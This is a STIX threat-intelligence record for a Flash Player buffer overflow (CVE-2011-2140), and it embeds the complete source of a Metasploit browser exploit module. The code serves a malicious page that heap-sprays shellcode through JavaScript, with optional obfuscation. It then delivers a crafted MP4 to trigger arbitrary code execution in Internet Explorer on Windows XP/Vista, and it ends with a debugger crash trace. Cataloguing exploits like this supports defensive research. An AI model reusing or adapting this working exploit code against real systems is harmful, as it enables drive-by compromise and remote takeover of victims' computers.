{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--d034d82c-030a-4998-b5c0-1ac868d64cad",
    "created": "2024-08-14T16:41:25.555775Z",
    "modified": "2024-08-14T16:41:25.55578Z",
    "name": "\"Adobe Flash Player MP4 SequenceParameterSetNALUnit Buffer Overflow\"",
    "description": " This module exploits a vulnerability found in Adobe Flash Player's Flash10u.ocx component.  When processing a MP4 file (specifically the Sequence Parameter Set) Flash will see if pic_order_cnt_type is equal to 1, which sets the num_ref_frames_in_pic_order_cnt_cycle field, and then blindly copies data in offset_for_ref_frame on the stack, which allows arbitrary remote code execution under the context of the user.  Numerous reports also indicate that this vulnerability has been exploited in the wild.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/browser/adobe_flash_sps.rb",
            "external_id": "adobe_flash_sps.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2011-2140"
        },
        {
            "source_name": "reference",
            "url": "http://www.kahusecurity.com/2011/cve-2011-2140-caught-in-the-wild/"
        },
        {
            "source_name": "reference",
            "url": "http://www.adobe.com/support/security/bulletins/apsb11-21.html"
        },
        {
            "source_name": "reference",
            "url": "http://0x1byte.blogspot.com/2011/11/analysis-of-cve-2011-2140-adobe-flash.html"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = NormalRanking\n\n  include Msf::Exploit::Remote::HttpServer::HTML\n\n  def initialize(info={})\n    super(update_info(info,\n      'Name'           => \"Adobe Flash Player MP4 SequenceParameterSetNALUnit Buffer Overflow\",\n      'Description'    => %q{\n          This module exploits a vulnerability found in Adobe Flash Player's Flash10u.ocx\n        component.  When processing a MP4 file (specifically the Sequence Parameter Set),\n        Flash will see if pic_order_cnt_type is equal to 1, which sets the\n        num_ref_frames_in_pic_order_cnt_cycle field, and then blindly copies data in\n        offset_for_ref_frame on the stack, which allows arbitrary remote code execution\n        under the context of the user.  Numerous reports also indicate that this\n        vulnerability has been exploited in the wild.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'Alexander Gavrun', # RCA\n          'Unknown',          # Abysssec, proof of concept\n          'sinn3r'            # Metasploit\n        ],\n      'References'     =>\n        [\n          [ 'CVE', '2011-2140' ],\n          [ 'OSVDB', '74439'],\n          [ 'BID', '49083' ],\n          [ 'ZDI', '11-276' ],\n          [ 'URL', 'http://www.kahusecurity.com/2011/cve-2011-2140-caught-in-the-wild/' ],\n          [ 'URL', 'http://www.adobe.com/support/security/bulletins/apsb11-21.html' ],\n          [ 'URL', 'http://0x1byte.blogspot.com/2011/11/analysis-of-cve-2011-2140-adobe-flash.html' ]\n        ],\n      'Payload'        =>\n        {\n          'BadChars'        => \"\\x00\",\n          'StackAdjustment' => -3500\n        },\n      'DefaultOptions'  =>\n        {\n          'EXITFUNC'         => \"seh\",\n          'InitialAutoRunScript' => 'post/windows/manage/priv_migrate'\n        },\n      'Platform'       => 'win',\n      'Targets'        =>\n        [\n          [ 'Automatic', {} ],\n          [ 'IE 6 on Windows XP SP3',         { 'Offset' => '0x600' } ], #0x5f4 = spot on\n          [ 'IE 7 on Windows XP SP3 / Vista', { 'Offset' => '0x600' } ]\n        ],\n      'Privileged'     => false,\n      'DisclosureDate' => '2011-08-09',\n      'DefaultTarget'  => 0))\n\n      register_options(\n        [\n          OptBool.new('OBFUSCATE', [false, 'Enable JavaScript obfuscation'])\n        ])\n  end\n\n  def get_target(agent)\n    #If the user is already specified by the user, we'll just use that\n    return target if target.name != 'Automatic'\n\n    if agent =~ /NT 5\\.1/ and agent =~ /MSIE 6/\n      return targets[1]\n    elsif agent =~ /MSIE 7/\n      return targets[2]\n    else\n      return nil\n    end\n  end\n\n  def on_request_uri(cli, request)\n    agent = request.headers['User-Agent']\n    my_target = get_target(agent)\n\n    # Avoid the attack if the victim doesn't have the same setup we're targeting\n    if my_target.nil?\n      print_error(\"Browser not supported: #{agent.to_s}\")\n      send_not_found(cli)\n      return\n    end\n\n    # The SWF requests our MP4 trigger\n    if request.uri =~ /\\.mp4$/\n      print_status(\"Sending MP4\")\n      send_response(cli, @mp4, {'Content-Type'=>'video/mp4'})\n      return\n    end\n\n    # The SWF request itself\n    if request.uri =~ /\\.swf$/\n      print_status(\"Sending SWF\")\n      send_response(cli, @swf, {'Content-Type'=>'application/x-shockwave-flash'})\n      return\n    end\n\n    # Redirect to a trailing slash so relative paths work properly\n    if get_resource != \"/\" and not request.uri.index(\"#{get_resource}/\")\n      uri = get_resource + \"/\"\n      send_redirect(cli, uri)\n      return\n    end\n\n    # Set payload depending on target\n    p = payload.encoded\n\n    js_code = Rex::Text.to_unescape(p, Rex::Arch.endian(target.arch))\n    js_nops = Rex::Text.to_unescape(\"\\x0c\"*4, Rex::Arch.endian(target.arch))\n    randnop = rand_text_alpha(rand(100) + 1)\n\n    js = <<-JS\n    var heap_obj = new heapLib.ie(0x20000);\n    var code = unescape(\"#{js_code}\");\n    var #{randnop} = \"#{js_nops}\";\n    var nops = unescape(#{randnop});\n\n    while (nops.length < 0x80000) nops += nops;\n    var offset = nops.substring(0, #{my_target['Offset']});\n    var shellcode = offset + code + nops.substring(0, 0x800-code.length-offset.length);\n\n    while (shellcode.length < 0x40000) shellcode += shellcode;\n    var block = shellcode.substring(0, (0x7ffc0-6)/2);\n\n    heap_obj.gc();\n\n    for (var i=1; i < 0x300; i++) {\n      heap_obj.alloc(block);\n    }\n    JS\n\n    js = heaplib(js, {:noobfu => true})\n\n    if datastore['OBFUSCATE']\n      js = ::Rex::Exploitation::JSObfu.new(js)\n      js.obfuscate(memory_sensitive: true)\n    end\n\n    myhost = (datastore['SRVHOST'] == '0.0.0.0') ? Rex::Socket.source_address('50.50.50.50') : datastore['SRVHOST']\n    mp4_uri = \"http://#{myhost}:#{datastore['SRVPORT']}#{get_resource()}/#{rand_text_alpha(rand(6)+3)}.mp4\"\n    swf_uri = Rex::Text.rand_text_alphanumeric(rand(8)+4) + \".swf\" + \"?autostart=true&image=video.jpg&file=#{mp4_uri}\"\n\n    html = %Q|\n    <html>\n    <head>\n    <script>\n    #{js}\n    </script>\n    </head>\n    <body>\n    <object width=\"1\" height=\"1\" type=\"application/x-shockwave-flash\" data=\"#{swf_uri}\">\n    <param name=\"movie\" value=\"#{swf_uri}\">\n    </object>\n    </body>\n    </html>\n    |\n\n    html = html.gsub(/^ {4}/, '')\n\n    print_status(\"Sending HTML\")\n    send_response(cli, html, {'Content-Type'=>'text/html'})\n  end\n\n  def exploit\n    @mp4 = create_mp4\n    @swf = create_swf\n    super\n  end\n\n  def create_swf\n    path = ::File.join( Msf::Config.data_directory, \"exploits\", \"mp4player.swf\" )\n    fd = ::File.open( path, \"rb\" )\n    swf = fd.read(fd.stat.size)\n    fd.close\n    return swf\n  end\n\n  def create_mp4\n    ftypAtom = \"\\x00\\x00\\x00\\x20\"                   #Size\n    ftypAtom << \"ftypisom\"\n    ftypAtom << \"\\x00\\x00\\x02\\x00\"\n    ftypAtom << \"isomiso2avc1mp41\"\n\n    mdatAtom = \"\\x00\\x00\\x00\\x10\"                   #Size\n    mdatAtom << \"mdat\"\n    mdatAtom << \"\\x00\\x00\\x02\\x8B\\x06\\x05\\xFF\\xFF\"\n\n    moovAtom1 = \"\\x00\\x00\\x08\\x83\"                  #Size\n    moovAtom1 << \"moov\"                             #Move header box header\n    moovAtom1 << \"\\x00\\x00\\x00\"\n    moovAtom1 << \"lmvhd\"                            # Type\n    moovAtom1 << \"\\x00\\x00\\x00\\x00\"                 # Version/Flags\n    moovAtom1 << \"\\x7C\\x25\\xB0\\x80\\x7C\\x25\\xB0\\x80\" # Creation time\n    moovAtom1 << \"\\x00\\x00\\x03\\xE8\"                 # Time scale\n    moovAtom1 << \"\\x00\\x00\\x2F\\x80\"                 # Duration\n    moovAtom1 << \"\\x00\\x01\\x00\\x00\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\"\n    moovAtom1 << \"\\x00\\x00\\x00\\x00\\x00\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x40\\x00\\x00\\x00\\x00\\x00\\x00\\x00\"\n    moovAtom1 << \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x03\\x00\\x00\\x02\\xFA\"\n    moovAtom1 << \"trak\"                             # Track box header\n    moovAtom1 << \"\\x00\\x00\\x00\\x5C\"\n    moovAtom1 << \"tkhd\"\n    moovAtom1 << \"\\x00\\x00\\x00\\x0F\"\n    moovAtom1 << \"\\x7C\\x25\\xB0\\x80\\x7C\\x25\\xB0\\x80\"  # Creation time\n    moovAtom1 << \"\\x00\\x00\\x00\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x2E\\xE0\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\"\n    moovAtom1 << \"\\x00\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\"\n    moovAtom1 << \"\\x00\\x00\\x00\\x00\\x40\\x00\\x00\\x00\\x01\\x42\\x00\\x00\\x01\\x42\\x00\\x00\\x00\\x00\\x02\"\n    moovAtom1 << \"rmdia\"\n    moovAtom1 << \"\\x00\\x00\\x00\\x20\"                  # Size\n    moovAtom1 << \"mdhd\"                              # Media header box\n    moovAtom1 << \"\\x00\\x00\\x00\\x00\"                  # Version/Flags\n    moovAtom1 << \"\\x7C\\x25\\xB0\\x80\\x7C\\x25\\xB0\\x80\"  # Creation time\n    moovAtom1 << \"\\x00\\x00\\x00\\x01\"                  # Time scale\n    moovAtom1 << \"\\x00\\x00\\x00\\x0C\"                  # Duration\n    moovAtom1 << \"\\x55\\xC4\\x00\\x00\"\n    moovAtom1 << \"\\x00\\x00\\x00\\x2D\"                  # Size\n    moovAtom1 << \"hdlr\"                              # Handler Reference header\n    moovAtom1 << \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\"\n    moovAtom1 << \"vide\"                              # Handler type\n    moovAtom1 << \"\\x00\\x00\\x00\\x00\\x00\"\n    moovAtom1 << \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\"\n    moovAtom1 << \"VideoHandler\"                      # Handler name\n    moovAtom1 << \"\\x00\\x00\\x00\\x02\\x1D\"\n    moovAtom1 << \"minf\"\n    moovAtom1 << \"\\x00\\x00\\x00\\x14\"\n    moovAtom1 << \"vmhd\"\n    moovAtom1 << \"\\x00\\x00\\x00\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x24\"\n    moovAtom1 << \"dinf\"                              # Data information box header\n    moovAtom1 << \"\\x00\\x00\\x00\\x1c\"\n    moovAtom1 << \"dref\"                              # Data reference box\n    moovAtom1 << \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x01\"\n    moovAtom1 << \"\\x00\\x00\\x00\\x0C\"                  # Size\n    moovAtom1 << \"url \"                              # Data entry URL box\n    moovAtom1 << \"\\x00\\x00\\x00\\x01\"                  # Location / version / flags\n    moovAtom1 << \"\\x00\\x00\\x09\\xDD\"                  # Size\n    moovAtom1 << \"stbl\"\n    moovAtom1 << \"\\x00\\x00\\x08\\x99\"\n    moovAtom1 << \"stsd\"\n    moovAtom1 << \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x01\"\n    moovAtom1 << \"\\x00\\x00\\x08\\x89\"                  # Size\n    moovAtom1 << \"avc1\"\n    moovAtom1 << \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\"\n    moovAtom1 << \"\\x01\\x42\"                          # Width\n    moovAtom1 << \"\\x01\\x42\"                          # Height\n    moovAtom1 << \"\\x00\\x48\\x00\\x00\\x00\\x48\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\"\n    moovAtom1 << \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\"\n    moovAtom1 << \"\\x18\"                              # Depth\n    moovAtom1 << \"\\xFF\\xFF\"\n    moovAtom1 << \"\\x00\\x00\\x08\\x33\"                  # Size\n    moovAtom1 << \"avcC\"\n    moovAtom1 << \"\\x01\"                              # Config version\n    moovAtom1 << \"\\x64\"                              # Avc profile indication\n    moovAtom1 << \"\\x00\"                              # Compatibility\n    moovAtom1 << \"\\x15\"                              # Avc level indication\n    moovAtom1 << \"\\xFF\\xE1\"\n\n    # Although the fields have different values, they all become 0x0c0c0c0c\n    # in memory.\n    cycle =  \"\\x00\\x00\\x00\"\n    cycle << \"\\x30\\x30\\x30\\x30\"  #6th\n    cycle << \"\\x00\\x00\\x00\"\n    cycle << \"\\x18\\x18\\x18\\x18\"  #7th\n    cycle << \"\\x00\\x00\\x00\"\n    cycle << \"\\x0c\\x0c\\x0c\\x0c\"  #8th\n    cycle << \"\\x00\\x00\\x00\"\n    cycle << \"\\x06\\x06\\x06\\x06\"  #1st\n    cycle << \"\\x00\\x00\\x00\"\n    cycle << \"\\x03\\x03\\x03\\x03\"\n    cycle << \"\\x00\\x00\\x00\\x01\\x81\\x81\\x81\\x80\\x00\\x00\\x00\"\n    cycle << \"\\xc0\\xc0\\xc0\\xc0\"  # 4th\n    cycle << \"\\x00\\x00\\x00\"\n    cycle << \"\\x60\\x60\\x60\\x60\"\n\n    spsunit =  \"\\x08\\x1A\\x67\\x70\\x34\\x32\\x74\\x70\\x00\\x00\\xAF\\x88\\x88\\x84\\x00\\x00\\x03\\x00\\x04\\x00\\x00\\x03\\x00\\x3F\\xFF\\xFF\\xFF\\xFF\\xFF\"\n    spsunit << \"\\xFF\\xFF\\xFF\\xFF\\xFF\\xFF\\xFF\\xFF\\xFF\\xFF\\xFF\\xFF\\xFF\\xFF\\xFF\\xFF\\xFF\\xFF\\xFF\\xFF\\xFF\\xFF\\xFF\\xFF\\xFF\\xFF\\xFF\\xFF\\xFF\"\n    spsunit << \"\\xFF\\xFF\\xFF\\xFF\\xFF\\xFF\\xFF\\xFF\\xFF\\xFF\\xFF\\xFF\\xFF\\xFF\\xFF\\xFF\\xFF\\xFC\"\n    spsunit << cycle * 35\n    spsunit << \"\\x00\\x00\\x00\\x30\\x30\\x03\\x03\\x03\\x03\\x00\\x00\\x00\\xB2\\x2C\"\n\n    moovAtom2 = \"\\x00\\x00\\x00\\x18\"\n    moovAtom2 << \"stts\"\n    moovAtom2 << \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x01\\x00\\x00\\x00\\x0C\\x00\\x00\\x00\\x01\"\n    moovAtom2 << \"\\x00\\x00\\x00\\x14\"\n    moovAtom2 << \"stss\"\n    moovAtom2 << \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x01\\x00\\x00\\x00\\x01\\x00\\x00\\x00\"\n    moovAtom2 << \"pctts\"\n    moovAtom2 << \"\\x00\\x00\\x00\\x00\\x00\\x00\"\n    moovAtom2 << \"\\x00\\x0C\\x00\\x00\\x00\\x01\\x00\\x00\\x00\\x02\\x00\\x00\\x00\\x01\\x00\\x00\\x00\\x03\\x00\\x00\\x00\\x01\\x00\\x00\\x00\\x01\\x00\\x00\\x00\"\n    moovAtom2 << \"\\x01\\x00\\x00\\x00\\x03\\x00\\x00\\x00\\x01\\x00\\x00\\x00\\x01\\x00\\x00\\x00\\x01\\x00\\x00\\x00\\x05\\x00\\x00\\x00\\x01\\x00\\x00\\x00\\x02\"\n    moovAtom2 << \"\\x00\\x00\\x00\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x01\\x00\\x00\\x00\\x01\\x00\\x00\\x00\\x01\\x00\\x00\\x00\\x03\\x00\\x00\\x00\\x01\\x00\"\n    moovAtom2 << \"\\x00\\x00\\x01\\x00\\x00\\x00\\x01\\x00\\x00\\x00\\x02\"\n    moovAtom2 << \"\\x00\\x00\\x00\\x1C\"\n    moovAtom2 << \"stsc\"\n    moovAtom2 << \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x01\\x00\\x00\\x00\\x01\\x00\\x00\\x00\\x01\\x00\\x00\\x00\\x01\"\n    moovAtom2 << \"\\x00\\x00\\x00\\x44\"\n    moovAtom2 << \"stsz\"\n    moovAtom2 << \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\"\n    moovAtom2 << \"\\x0C\\x00\\x00\\x2F\\x8D\\x00\\x00\\x0C\\xFE\\x00\\x00\\x04\\x42\\x00\\x00\\x0B\\x20\\x00\\x00\\x04\\x58\\x00\\x00\\x07\\x19\\x00\\x00\\x07\"\n    moovAtom2 << \"\\x63\\x00\\x00\\x02\\xD6\\x00\\x00\\x03\\xC1\\x00\\x00\\x0A\\xDF\\x00\\x00\\x04\\x9B\\x00\\x00\\x09\\x39\"\n    moovAtom2 << \"\\x00\\x00\\x00\\x40\"\n    moovAtom2 << \"stco\"\n    moovAtom2 << \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x0C\\x00\\x00\\x00\\x30\\x00\\x00\\x2F\\xBD\\x00\\x00\\x3D\\x8A\\x00\\x00\\x48\\x19\\x00\\x00\\x5A\\xF4\"\n    moovAtom2 << \"\\x00\\x00\\x66\\x1F\\x00\\x00\\x73\\xEA\\x00\\x00\\x82\\x32\\x00\\x00\\x8A\\xFA\\x00\\x00\\x95\\x51\\x00\\x00\\xA7\\x16\\x00\\x00\\xB1\\xE5\"\n\n    moovAtom = moovAtom1 + spsunit + moovAtom2\n    m = ftypAtom + mdatAtom + moovAtom\n    return m\n  end\nend\n\n=begin\nC:\\WINDOWS\\system32\\Macromed\\Flash\\Flash10u.ocx\n\nFlash10u+0x5b4e8:\nMissing image name, possible paged-out or corrupt data.\n1f06b4e8 8901            mov     dword ptr [ecx],eax  ds:0023:020c0000=00905a4d\n0:008> !exchain\n020bfdfc: <Unloaded_ud.drv>+c0c0c0b (0c0c0c0c)\n\nECX points to 0x0c0c0c0c at the time of the crash:\n0:008> r\neax=00000000 ebx=00000000 ecx=0c0c0c0c edx=7c9032bc esi=00000000 edi=00000000\neip=0c0c0c0c esp=020befa8 ebp=020befc8 iopl=0         nv up ei pl zr na pe nc\ncs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00050246\n<Unloaded_ud.drv>+0xc0c0c0b:\n0c0c0c0c ??              ???\n\nExample of SWF player URI:\nhttp://www.jeroenwijering.com/embed/mediaplayer.swf\n\nTo-do:\nIE 8 target\n=end\n",
    "x_mitre_disclosure_date": "2011-08-09",
    "x_mitre_platforms": [
        "win'"
    ]
}